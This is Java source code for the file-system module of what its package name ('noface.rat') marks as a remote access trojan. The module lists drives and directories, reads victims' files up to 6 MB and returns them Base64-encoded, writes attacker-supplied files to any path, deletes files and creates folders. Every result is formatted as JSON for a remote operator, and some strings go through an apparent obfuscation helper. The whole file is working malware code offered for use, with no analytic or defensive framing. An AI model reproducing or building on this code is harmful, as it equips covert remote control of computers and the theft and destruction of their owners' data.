package noface.rat;

import noface.config.S;

import java.io.IOException;
import java.nio.file.AccessDeniedException;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Base64;
import java.util.Locale;

public final class Fs {

    private static final long MAX_GET = 6L * 1024 * 1024;

    public static String list(String raw) {
        Path p = null;
        try {
            p = resolve(raw == null || raw.isBlank() ? rootsHint() : raw);
            if (p == null) return fail("fs.list", "", S.e("bad"));
            if (!Files.exists(p)) return fail("fs.list", p.toString(), S.e("missing"));
            StringBuilder b = new StringBuilder(512);
            b.append("{\"op\":\"fs.list\",\"path\":\"").append(esc(p.toString())).append("\",\"entries\":[");
            boolean first = true;
            if (Files.isDirectory(p)) {
                try (DirectoryStream<Path> ds = Files.newDirectoryStream(p)) {
                    for (Path c : ds) {
                        if (!first) b.append(',');
                        first = false;
                        boolean dir = Files.isDirectory(c);
                        long size = 0;
                        try {
                            if (!dir) size = Files.size(c);
                        } catch (Exception ignored) {
                        }
                        String name = c.getFileName() == null ? c.toString() : c.getFileName().toString();
                        b.append("{\"n\":\"").append(esc(name))
                                .append("\",\"d\":").append(dir)
                                .append(",\"s\":").append(size).append('}');
                    }
                }
            }
            b.append("]}");
            return b.toString();
        } catch (AccessDeniedException e) {
            return fail("fs.list", p == null ? "" : p.toString(), S.e("denied"));
        } catch (Exception e) {
            return fail("fs.list", p == null ? "" : p.toString(), e.getMessage());
        }
    }

    public static String roots() {
        StringBuilder b = new StringBuilder("{\"op\":\"fs.roots\",\"path\":\"\",\"entries\":[");
        boolean first = true;
        for (Path r : Path.of("").getFileSystem().getRootDirectories()) {
            if (!first) b.append(',');
            first = false;
            b.append("{\"n\":\"").append(esc(r.toString())).append("\",\"d\":true,\"s\":0}");
        }
        b.append("]}");
        return b.toString();
    }

    public static String get(String raw) {
        try {
            Path p = resolve(raw);
            if (p == null || !Files.isRegularFile(p)) return fail("fs.get", "", S.e("bad"));
            long size = Files.size(p);
            if (size > MAX_GET) return fail("fs.get", p.toString(), S.e("too_big"));
            byte[] data = Files.readAllBytes(p);
            return "{\"op\":\"fs.get\",\"path\":\"" + esc(p.toString())
                    + "\",\"name\":\"" + esc(p.getFileName().toString())
                    + "\",\"data\":\"" + Base64.getEncoder().encodeToString(data) + "\"}";
        } catch (AccessDeniedException e) {
            return fail("fs.get", "", S.e("denied"));
        } catch (Exception e) {
            return fail("fs.get", "", e.getMessage());
        }
    }

    public static String put(String raw, String b64) {
        try {
            Path p = resolve(raw);
            if (p == null) return fail("fs.put", "", S.e("bad"));
            byte[] data = Base64.getDecoder().decode(b64 == null ? "" : b64);
            if (data.length > MAX_GET) return fail("fs.put", p.toString(), S.e("too_big"));
            if (p.getParent() != null) Files.createDirectories(p.getParent());
            Files.write(p, data, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING, StandardOpenOption.WRITE);
            return "{\"op\":\"fs.put\",\"ok\":true,\"path\":\"" + esc(p.toString()) + "\"}";
        } catch (Exception e) {
            return fail("fs.put", "", e.getMessage());
        }
    }

    public static String del(String raw) {
        try {
            Path p = resolve(raw);
            if (p == null) return fail("fs.del", "", S.e("bad"));
            Files.deleteIfExists(p);
            return "{\"op\":\"fs.del\",\"ok\":true}";
        } catch (Exception e) {
            return fail("fs.del", "", e.getMessage());
        }
    }

    public static String mkdir(String raw) {
        try {
            Path p = resolve(raw);
            if (p == null) return fail("fs.mkdir", "", S.e("bad"));
            Files.createDirectories(p);
            return "{\"op\":\"fs.mkdir\",\"ok\":true,\"path\":\"" + esc(p.toString()) + "\"}";
        } catch (Exception e) {
            return fail("fs.mkdir", "", e.getMessage());
        }
    }

    private static String fail(String op, String path, String err) {
        return "{\"op\":\"" + op + "\",\"path\":\"" + esc(path) + "\",\"entries\":[],\"err\":\"" + esc(err) + "\"}";
    }

    private static String rootsHint() {
        for (Path r : Path.of("").getFileSystem().getRootDirectories()) {
            return r.toString();
        }
        return System.getenv(S.e("SystemDrive")) + "\\";
    }

    private static Path resolve(String raw) throws IOException {
        if (raw == null || raw.isBlank()) return null;
        Path p = Paths.get(raw).toAbsolutePath().normalize();
        String s = p.toString().toLowerCase(Locale.ROOT);
        if (s.contains("..")) return null;
        return p;
    }

    private static String esc(String s) {
        if (s == null) return "";
        StringBuilder b = new StringBuilder(s.length() + 8);
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '\\' -> b.append("\\\\");
                case '"' -> b.append("\\\"");
                case '\n' -> b.append("\\n");
                case '\r' -> b.append("\\r");
                default -> {
                    if (c < 32) b.append(' ');
                    else b.append(c);
                }
            }
        }
        return b.toString();
    }

    private Fs() {}
}
